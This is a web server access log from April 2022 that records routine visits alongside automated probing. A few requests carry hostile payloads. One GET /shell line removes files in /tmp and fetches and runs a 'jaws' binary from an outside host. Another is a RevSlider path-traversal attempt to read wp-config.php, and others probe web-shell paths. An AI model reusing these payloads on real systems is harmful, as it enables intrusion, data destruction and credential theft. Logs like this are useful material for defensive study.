[pid: 24815|app: 0|req: 51/98] 154.198.211.130 () {30 vars in 334 bytes} [Sat Apr 23 10:44:07 2022] GET / => generated 139 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 28/99] 154.198.211.130 () {32 vars in 394 bytes} [Sat Apr 23 10:44:27 2022] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24814|app: 0|req: 10/100] 154.198.211.130 () {32 vars in 392 bytes} [Sat Apr 23 10:44:28 2022] GET /robots.txt => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 29/101] 154.198.211.130 () {32 vars in 394 bytes} [Sat Apr 23 10:44:29 2022] GET /sitemap.xml => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 52/102] 47.241.74.65 () {32 vars in 371 bytes} [Sat Apr 23 10:57:57 2022] GET / => generated 157 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 53/103] 83.97.20.34 () {30 vars in 327 bytes} [Sat Apr 23 11:25:55 2022] GET / => generated 139 bytes in 1 msecs (HTTP/1.0 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 54/104] 186.251.229.46 () {32 vars in 461 bytes} [Sat Apr 23 12:20:31 2022] GET / => generated 148 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24814|app: 0|req: 11/105] 156.204.210.212 () {34 vars in 570 bytes} [Sat Apr 23 13:01:32 2022] GET /shell?cd+/tmp;rm+-rf+*;wget+ tigoinari.tk/jaws;sh+/tmp/jaws => generated 179 bytes in 2 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 55/106] 157.230.4.206 () {32 vars in 464 bytes} [Sat Apr 23 13:33:43 2022] GET / => generated 145 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 56/107] 157.230.4.206 () {34 vars in 488 bytes} [Sat Apr 23 13:33:44 2022] GET / => generated 145 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24814|app: 0|req: 12/108] 157.230.4.206 () {32 vars in 478 bytes} [Sat Apr 23 13:33:45 2022] GET /wp-json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 30/109] 157.230.4.206 () {32 vars in 607 bytes} [Sat Apr 23 13:33:45 2022] GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24812|app: 0|req: 31/110] 157.230.4.206 () {32 vars in 564 bytes} [Sat Apr 23 13:33:46 2022] GET /wp-content/plugins/breeze/assets/js/breeze-main.js => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 57/111] 157.230.4.206 () {32 vars in 464 bytes} [Sat Apr 23 13:33:46 2022] GET / => generated 145 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 32/112] 113.200.174.49 () {38 vars in 644 bytes} [Sat Apr 23 13:35:38 2022] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 58/113] 198.235.24.143 () {30 vars in 597 bytes} [Sat Apr 23 13:43:36 2022] GET / => generated 148 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24814|app: 0|req: 13/114] 8.219.50.83 () {32 vars in 370 bytes} [Sat Apr 23 14:02:52 2022] GET / => generated 157 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 59/115] 3.249.196.154 () {34 vars in 515 bytes} [Sat Apr 23 14:14:24 2022] GET / => generated 145 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 225 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 60/116] 151.106.17.124 () {44 vars in 728 bytes} [Sat Apr 23 15:17:06 2022] POST /upl.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 61/117] 113.200.174.49 () {38 vars in 644 bytes} [Sat Apr 23 15:40:40 2022] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 33/118] 113.200.174.49 () {42 vars in 877 bytes} [Sat Apr 23 15:40:41 2022] GET / => generated 5826 bytes in 9 msecs (HTTP/1.1 200) 8 headers in 402 bytes (1 switches on core 0)
[pid: 24811|app: 0|req: 12/119] 113.200.174.49 () {42 vars in 857 bytes} [Sat Apr 23 15:40:42 2022] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 62/120] 113.200.174.49 () {42 vars in 973 bytes} [Sat Apr 23 15:52:03 2022] GET / => generated 5826 bytes in 12 msecs (HTTP/1.1 200) 8 headers in 402 bytes (1 switches on core 0)
[pid: 24815|app: 0|req: 63/121] 113.200.174.49 () {42 vars in 928 bytes} [Sat Apr 23 15:52:05 2022] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 176 bytes (1 switches on core 1)
[pid: 24811|app: 0|req: 13/122] 113.200.174.49 () {44 vars in 1024 bytes} [Sat Apr 23 15:52:06 2022] GET /users/ => generated 11532 bytes in 43 msecs (HTTP/1.1 200) 8 headers in 409 bytes (1 switches on core 1)
[pid: 24812|app: 0|req: 34/123] 83.97.20.34 () {30 vars in 327 bytes} [Sat Apr 23 15:54:38 2022] GET / => generated 139 bytes in 1 msecs (HTTP/1.0 200) 7 headers in 225 bytes (1 switches on core 1)
[pid: 24815|app: 0|req: 64/124] 178.210.87.251 () {38 vars in 632 bytes} [Sat Apr 23 15:55:28 2022] GET /style.php?sig=rename => generated 179 bytes in 1 msecs (HTTP/1.0 404) 5 headers in 176 bytes (1 switches on core 0)
